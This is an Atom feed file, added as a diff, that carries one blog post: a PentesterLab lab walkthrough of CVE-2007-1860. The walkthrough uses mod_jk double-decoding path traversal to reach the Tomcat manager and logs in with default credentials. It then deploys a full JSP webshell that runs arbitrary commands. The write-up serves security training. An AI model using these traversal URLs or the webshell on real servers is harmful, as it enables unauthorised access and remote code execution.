@@ -1,0 +1,168 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: mod_jk double-decoding | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/mod-jk-double-decoding/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2016-04-27T15:40:42-05:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Pentesterlab--cve-2007-1860]]></title>
+    <link href="http://wg135.github.io/blog/2016/04/05/pentesterlab-cve-2007-1860/"/>
+    <updated>2016-04-05T12:04:47-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/04/05/pentesterlab-cve-2007-1860</id>
+    <content type="html"><![CDATA[<p><em>By means of these seven considerations I can forecast victory or defeat.</em> &mdash;&ndash; The Art of War</p>
+
+<p>This course details the exploitation of a vulnerability in mod_jk and how by using this issue it is possible to access the administration interface of a Tomcat server (Tomcat&rsquo;s manager). Then using this access, we will see how an attacker can use default credentials to log in as administrator and use this access to gain code execution on the server. &mdash;Pentesterlab</p>
+
+<p>Difficluty: 2/5</p>
+
+<!--more-->
+
+
+<h3>Forces:</h3>
+
+<ul>
+<li>Nmap</li>
+<li>NC</li>
+<li>Firebug</li>
+<li>webshell</li>
+</ul>
+
+
+<h3>Detail Assessment and Planning</h3>
+
+<ul>
+<li>Port scan to identify opened ports, running services and services version. &mdash;&ndash; Nmap</li>
+<li>Check http headers. &mdash;&ndash; NC</li>
+<li>Exploit and upload webshell. &mdash;- Firebug</li>
+</ul>
+
+
+<h3>Waging War</h3>
+
+<h4>Weaknesses and Strengths</h4>
+
+<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>
+
+<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>By checking the application HTTP headers with nc, I can also get Apache service version.</p>
+
+<pre><code>GET / HTTP/1.1
+Host: 192.168.79.168
+</code></pre>
+
+<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<h4>Attack</h4>
+
+<p>First of all, we need to figure out the architecture of Tomcat and Apache. Read <a href="https://pentesterlab.com/exercises/cve-2007-1860/course">here</a></p>
+
+<p>If we try to visit a non-exist page, we will receive 404 error like that:</p>
+
+<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Based on the result, we know the http request is processed by Apache.</p>
+
+<p>If we try to visit page like 192.168.79.168/examples/jsp/test404, we will get the 404 error like:</p>
+
+<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Then we know that the http request is processed by Tomcat through Apache.</p>
+
+<p>Tomcat Manager is available at the following URI: /manager/html and is, most of the time, protected by a password. The CVE-2007-1860 vulnerability is described <a href="http://mail-archives.apache.org/mod_mbox/tomcat-dev/200706.mbox/%3C4667755F.6070700@apache.org%3E">advisory</a></p>
+
+<p>From pentesterlab,</p>
+
+<p><em>If you provide this %252e to a vulnerable modjk, it will perform a first decoding and send the value %2e to Tomcat. Tomcat will then perform a second decoding to get the value .. If you use %252e%252e, you will then be able to send .. to Tomcat. If you try to send .. directly to Apache, it will not forward the request to Tomcat unless the path resolve to a path configured to be forwarded to Tomcat (using <code>modjk</code>).</em></p>
+
+<p>Now we know how to access the /manager/html, (Sometimes you may need to repeat several times %252e%252e/)</p>
+
+<p><code>http://192.168.79.168/examples/jsp/%252e%252e/%252e%252e/manager/html</code></p>
+
+<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The credentials are one of the default ones. In this exerciese, the admin didn&rsquo;t change the credentials. The user name is admin and password is empty. Once we get it, we are able to get acces to the Tomcat Manager.</p>
+
+<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Now we need to create a webshell and upload it to the Tomcat.</p>
+
+<h4>Deploy a webshell</h4>
+
+<p>webshell (from pentesterlab, you may generate it using msfvenom)</p>
+
+<p>```jsp index.jsp
+<FORM METHOD=GET ACTION='index.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
+</FORM>
+&lt;%@ page import=&ldquo;java.io.*&rdquo; %>
+&lt;%
+   String cmd = request.getParameter(&ldquo;cmd&rdquo;);
+   String output = &ldquo;&rdquo;;
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) { output += s+&ldquo;</br>&rdquo;; }
+      }  catch(IOException e) {   e.printStackTrace();   }
+   }
+%></p>
+
+<pre><%=output %></pre>
+
+
+<pre><code>
+now we have to  pack the webshell
+</code></pre>
+
+<p>$ mkdir webshell
+$ cp index.jsp webshell</p>
+
+<p>$ cd webshell
+$ jar -cvf ../webshell.war *</p>
+
+<p>```</p>
+
+<p>webshell <code>webshell.war</code> is ready to fire.</p>
+
+<h4>Upload webshell</h4>
+
+<p>We can use the form to upload war file:
+<img src="/images/blog/pentesterlab/cve_2007_1860/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>However, it will give you a 404 page since the deployment url does not use the double -encoding trick to gain access to get the manager. So we have to use firebug to give the form right location.</p>
+
+<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>change the location to :</p>
+
+<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>After successful uploading webshell, it will show in the Tomcat manager:</p>
+
+<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now enjoy the webshell by accessing</p>
+
+<p><code>http://192.168.79.168/examples/%252e%252e/webshell/</code></p>
+
+<p> <img src="/images/blog/pentesterlab/cve_2007_1860/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE</p>
+
+<p><img src="/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+</feed>
